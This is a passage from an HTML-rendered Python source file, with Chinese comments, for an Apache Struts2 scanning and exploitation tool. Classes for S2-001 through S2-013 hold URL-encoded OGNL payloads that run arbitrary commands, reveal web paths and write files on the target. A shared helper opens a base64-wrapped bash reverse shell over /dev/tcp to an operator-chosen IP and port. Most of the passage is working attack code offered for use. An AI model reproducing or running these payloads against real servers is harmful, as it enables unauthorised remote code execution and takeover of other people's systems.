str(e)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def parse_cmd(cmd, type=&#x27;string&#x27;):</span><br><span class="line">    &quot;&quot;&quot;命令解析，将要执行的命令解析为字符串格式&quot;&quot;&quot;</span><br><span class="line">    cmd = shlex.split(cmd)</span><br><span class="line">    if type == &#x27;string&#x27;:</span><br><span class="line">        cmd_str = &#x27;&quot;&#x27; + &#x27;&quot;,&quot;&#x27;.join(cmd) + &#x27;&quot;&#x27;</span><br><span class="line">    elif type == &#x27;xml&#x27;:</span><br><span class="line">        cmd_str = &#x27;&lt;string&gt;&#x27; + &#x27;&lt;/string&gt;&lt;string&gt;&#x27;.join(cmd) + &#x27;&lt;/string&gt;&#x27;</span><br><span class="line">    else:</span><br><span class="line">        cmd_str = cmd</span><br><span class="line">    return cmd_str</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def parse_headers(headers):</span><br><span class="line">    &quot;&quot;&quot;将headers字符串解析为字典&quot;&quot;&quot;</span><br><span class="line">    if not headers:</span><br><span class="line">        return default_headers</span><br><span class="line">    new_headers = copy.deepcopy(default_headers)</span><br><span class="line">    headers = headers.split(&#x27;&amp;&#x27;)</span><br><span class="line">    for header in headers:</span><br><span class="line">        header = header.split(&#x27;:&#x27;)</span><br><span class="line">        new_headers[header[0].strip()] = header[1].strip()</span><br><span class="line">    return new_headers</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_hash():</span><br><span class="line">    &quot;&quot;&quot;获取随机字符串&quot;&quot;&quot;</span><br><span class="line">    letters = string.ascii_letters</span><br><span class="line">    rand = &#x27;&#x27;.join(random.sample(letters, 10))</span><br><span class="line">    hash = hashlib.md5(rand.encode()).hexdigest()</span><br><span class="line">    return hash</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def echo_check(self):</span><br><span class="line">    &quot;&quot;&quot;通过echo输出检查漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">    hash_str = get_hash()</span><br><span class="line">    html = self.exec_cmd(&quot;echo &quot; + hash_str)</span><br><span class="line">    if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">        return html</span><br><span class="line">    elif hash_str in html:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def reverse_shell(self, ip, port):</span><br><span class="line">    &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">    cmd = &quot;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125;/&#123;port&#125; 0&gt;&amp;1&quot;.format(ip=ip, port=port)</span><br><span class="line">    cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line">    shell = self.shell.replace(&#x27;SHELL&#x27;, cmd)</span><br><span class="line">    html = self.exec_cmd(shell)</span><br><span class="line">    return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_file(file_path):</span><br><span class="line">    &quot;&quot;&quot;检查文件是否存在&quot;&quot;&quot;</span><br><span class="line">    if os.path.exists(file_path):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        click.secho(&quot;[ERROR] &#123;file&#125;文件不存在!&quot;.format(file=file_path), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read_file(file_path, encoding=&#x27;UTF-8&#x27;):</span><br><span class="line">    &quot;&quot;&quot;读文件，默认使用UTF-8编码&quot;&quot;&quot;</span><br><span class="line">    if check_file(file_path):</span><br><span class="line">        with open(file_path, &#x27;r&#x27;, encoding=encoding) as f:</span><br><span class="line">            data = f.read()</span><br><span class="line">        return data</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def read_urls(file):</span><br><span class="line">    &quot;&quot;&quot;读取URL文件&quot;&quot;&quot;</span><br><span class="line">    if check_file(file):</span><br><span class="line">        with open(file, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f:</span><br><span class="line">            urls = f.readlines()</span><br><span class="line">        urls = [url.strip() for url in urls if url and url.strip()]</span><br><span class="line">        return urls</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def check_int(name, t):</span><br><span class="line">    &quot;&quot;&quot;检查int变量&quot;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        t = int(t)</span><br><span class="line">        return t</span><br><span class="line">    except Exception as e:</span><br><span class="line">        click.secho(&quot;[ERROR] 参数&#123;name&#125;必须为整数!&quot;.format(name=name), fg=&#x27;red&#x27;)</span><br><span class="line">        exit(0)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_001:</span><br><span class="line">    &quot;&quot;&quot;S2-001漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell&quot;</span><br><span class="line">    check_poc = &quot;%25%7B&#123;num1&#125;%2B&#123;num2&#125;%7D&quot;</span><br><span class="line">    web_path = &quot;%25%7B%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23response%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23response.println(%23req.getRealPath(&#x27;%2F&#x27;))%2C%23response.flush()%2C%23response.close()%7D&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        num1 = random.randint(10000, 100000)</span><br><span class="line">        num2 = random.randint(10000, 100000)</span><br><span class="line">        poc = self.check_poc.format(num1=num1, num2=num2)</span><br><span class="line">        data = self.data.format(exp=poc)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        nn = str(num1 + num2)</span><br><span class="line">        if html.startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        elif nn in html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-001&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.web_path)</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_003:</span><br><span class="line">    &quot;&quot;&quot;S2-003漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据; 支持任意命令执行&quot;</span><br><span class="line">    exec_payload = &quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-003&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_005:</span><br><span class="line">    &quot;&quot;&quot;S2-005漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据; 支持获取WEB路径,任意命令执行&quot;</span><br><span class="line">    web_path = &quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43req%5C75@org.apache.struts2.ServletActionContext@getRequest%28%29%27%29%28d%29%29&amp;%28i2%29%28%28%27%5C43xman%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28i97%29%28%28%27%5C43xman.getWriter%28%29.println%28%5C43req.getRealPath%28%22%5Cu005c%22%29%29%27%29%28d%29%29&amp;%28i99%29%28%28%27%5C43xman.getWriter%28%29.close%28%29%27%29%28d%29%29&quot;</span><br><span class="line">    exec_payload1 = &quot;%28%27%5Cu0023context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5Cu003dfalse%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023_memberAccess.excludeProperties%5Cu003d@java.util.Collections@EMPTY_SET%27%29%28kxlzx%29%28kxlzx%29&amp;%28%27%5Cu0023_memberAccess.allowStaticMethodAccess%5Cu003dtrue%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023mycmd%5Cu003d%5C%27&#123;cmd&#125;%5C%27%27%29%28bla%29%28bla%29&amp;%28%27%5Cu0023myret%5Cu003d@java.lang.Runtime@getRuntime%28%29.exec%28%5Cu0023mycmd%29%27%29%28bla%29%28bla%29&amp;%28A%29%28%28%27%5Cu0023mydat%5Cu003dnew%5C40java.io.DataInputStream%28%5Cu0023myret.getInputStream%28%29%29%27%29%28bla%29%29&amp;%28B%29%28%28%27%5Cu0023myres%5Cu003dnew%5C40byte[51020]%27%29%28bla%29%29&amp;%28C%29%28%28%27%5Cu0023mydat.readFully%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28D%29%28%28%27%5Cu0023mystr%5Cu003dnew%5C40java.lang.String%28%5Cu0023myres%29%27%29%28bla%29%29&amp;%28%27%5Cu0023myout%5Cu003d@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28bla%29%28bla%29&amp;%28E%29%28%28%27%5Cu0023myout.getWriter%28%29.println%28%5Cu0023mystr%29%27%29%28bla%29%29&quot;</span><br><span class="line">    exec_payload2 = &quot;%28%27%5C43_memberAccess.allowStaticMethodAccess%27%29%28a%29=true&amp;%28b%29%28%28%27%5C43context[%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27]%5C75false%27%29%28b%29%29&amp;%28%27%5C43c%27%29%28%28%27%5C43_memberAccess.excludeProperties%5C75@java.util.Collections@EMPTY_SET%27%29%28c%29%29&amp;%28g%29%28%28%27%5C43mycmd%5C75%5C%27&#123;cmd&#125;%5C%27%27%29%28d%29%29&amp;%28h%29%28%28%27%5C43myret%5C75@java.lang.Runtime@getRuntime%28%29.exec%28%5C43mycmd%29%27%29%28d%29%29&amp;%28i%29%28%28%27%5C43mydat%5C75new%5C40java.io.DataInputStream%28%5C43myret.getInputStream%28%29%29%27%29%28d%29%29&amp;%28j%29%28%28%27%5C43myres%5C75new%5C40byte[51020]%27%29%28d%29%29&amp;%28k%29%28%28%27%5C43mydat.readFully%28%5C43myres%29%27%29%28d%29%29&amp;%28l%29%28%28%27%5C43mystr%5C75new%5C40java.lang.String%28%5C43myres%29%27%29%28d%29%29&amp;%28m%29%28%28%27%5C43myout%5C75@org.apache.struts2.ServletActionContext@getResponse%28%29%27%29%28d%29%29&amp;%28n%29%28%28%27%5C43myout.getWriter%28%29.println%28%5C43mystr%29%27%29%28d%29%29&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;选择可以利用成功的payload&quot;&quot;&quot;</span><br><span class="line">        self.exec_payload = self.exec_payload1</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-005&#x27;</span><br><span class="line">        else:</span><br><span class="line">            self.exec_payload = self.exec_payload2</span><br><span class="line">            html = echo_check(self)</span><br><span class="line">            if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">                return html</span><br><span class="line">            if html:</span><br><span class="line">                self.is_vul = True</span><br><span class="line">                return &#x27;S2-005&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &#x27;?&#x27; + self.web_path, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get_stream(self.url + &#x27;?&#x27; + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_007:</span><br><span class="line">    &quot;&quot;&quot;S2-007漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;&#x27;%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()))%20%2B%20&#x27;&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;username=test&amp;password=&#123;exp&#125;&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-007&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        data = self.data.format(exp=self.exec_payload.format(cmd=quote(cmd)))</span><br><span class="line">        html = post_stream(self.url, data, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_008:</span><br><span class="line">    &quot;&quot;&quot;S2-008漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27&#123;cmd&#125;%27%29.getInputStream%28%29%29)&quot;</span><br><span class="line"> </span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-008&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_009:</span><br><span class="line">    &quot;&quot;&quot;S2-009漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据,URL后面需要请求参数名; 默认为: key; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27&#123;cmd&#125;%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(&#123;key&#125;)(%27meh%27)]&quot;</span><br><span class="line"> </span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        if not data:</span><br><span class="line">            self.data = &quot;key&quot;</span><br><span class="line">        else:</span><br><span class="line">            self.data = data.split(&#x27;=&#x27;)[0].strip()</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-009&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd), key=self.data)</span><br><span class="line">        html = get(self.url + &quot;&amp;&#123;key&#125;=&#123;payload&#125;&quot;.format(key=self.data, payload=payload), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_012:</span><br><span class="line">    &quot;&quot;&quot;S2-012漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据,参数直接添加到URL后面; 默认为:name; 支持任意命令执行和反弹shell&quot;</span><br><span class="line">    exec_payload = &quot;%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B&#123;cmd&#125;%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-012&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, cmd):</span><br><span class="line">        &quot;&quot;&quot;执行命令&quot;&quot;&quot;</span><br><span class="line">        cmd = parse_cmd(cmd)</span><br><span class="line">        payload = self.exec_payload.format(cmd=quote(cmd))</span><br><span class="line">        html = get(self.url + payload, self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def reverse_shell(self, ip, port):</span><br><span class="line">        &quot;&quot;&quot;反弹shell&quot;&quot;&quot;</span><br><span class="line">        html = reverse_shell(self, ip, port)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class S2_013:</span><br><span class="line">    &quot;&quot;&quot;S2-013/S2-014漏洞检测利用类&quot;&quot;&quot;</span><br><span class="line">    info = &quot;[+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传&quot;</span><br><span class="line">    web_path = &quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D%40org.apache.struts2.ServletActionContext%40getRequest()%2C%23k8out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23k8out.println(%23req.getRealPath(%22%2F%22))%2C%23k8out.close())%7D&quot;</span><br><span class="line">    exec_payload = &quot;%24%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;&#123;cmd&#125;&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(%23d)%2C%23out.close())%7D&quot;</span><br><span class="line">    upload_paylaod = &quot;$%7B(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23fos=%20new%20java.io.FileOutputStream(%23req.getParameter(%22f%22)),%23fos.write(%23req.getParameter(%22t%22).getBytes()),%23fos.close(),%23outstr.println(%22OK%22),%23outstr.close())%7D&quot;</span><br><span class="line">    shell = &quot;bash -c &#123;echo,SHELL&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br><span class="line"> </span><br><span class="line">    def __init__(self, url, data=None, headers=None, encoding=&quot;UTF-8&quot;):</span><br><span class="line">        self.url = url</span><br><span class="line">        self.headers = parse_headers(headers)</span><br><span class="line">        self.encoding = encoding</span><br><span class="line">        self.is_vul = False</span><br><span class="line">        if &#x27;Content-Type&#x27; not in self.headers:</span><br><span class="line">            self.headers[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded&#x27;</span><br><span class="line"> </span><br><span class="line">    def check(self):</span><br><span class="line">        &quot;&quot;&quot;检测漏洞是否存在&quot;&quot;&quot;</span><br><span class="line">        html = echo_check(self)</span><br><span class="line">        if str(html).startswith(&quot;ERROR:&quot;):</span><br><span class="line">            return html</span><br><span class="line">        if html:</span><br><span class="line">            self.is_vul = True</span><br><span class="line">            return &#x27;S2-013&#x27;</span><br><span class="line">        return self.is_vul</span><br><span class="line"> </span><br><span class="line">    def get_path(self):</span><br><span class="line">        &quot;&quot;&quot;获取web目录&quot;&quot;&quot;</span><br><span class="line">        html = get(self.url + &quot;?x=&#123;payload&#125;&quot;.format(payload=self.web_path), self.headers, self.encoding)</span><br><span class="line">        return html</span><br><span class="line"> </span><br><span class="line">    def exec_cmd(self, 